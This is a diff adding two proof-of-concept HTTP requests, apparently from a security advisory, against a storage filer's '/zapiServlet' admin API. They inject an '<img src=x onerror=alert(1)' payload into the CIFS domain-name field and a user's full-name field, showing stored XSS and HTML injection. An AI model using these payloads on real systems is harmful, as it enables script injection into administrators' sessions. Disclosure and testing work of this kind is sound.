@@ -1,0 +1,23 @@
+XSS:
+
+Request (domain-name):
+    POST /zapiServlet HTTP/1.1
+    Host: 127.0.0.1:1195
+    [...]
+    <netapp version="1.7" 
+xmlns="http://www.example.com/filer/admin";><cifs-setup><auth-type>workgroup</auth-type><domain-name><img src=x 
+onerror=alert(1) 
+    </domain-name><security-style>multiprotocol</security-style><server-name>FILER</server-name></cifs-setup></netapp>
+
+
+HTML-injection:
+
+Request (full-name):
+    POST /zapiServlet HTTP/1.1
+    Host: 127.0.0.1:1457
+    [...]
+    <netapp version="1.7" 
+xmlns="http://www.example.com/filer/admin";><useradmin-user-modify><useradmin-user><useradmin-user-info><full-name>test<img
+ src=x onerror=alert(1) 
+    </full-name><comment>test</comment><name>test</name><password-maximum-age>4294967295</password-maximum-age><password-minimum-age>0</password-minimum-age><useradmin-groups><useradmin-group-info><name>Administrators</name></useradmin-group-info></useradmin-groups></useradmin-user-info></useradmin-user></useradmin-user-modify></netapp>
+
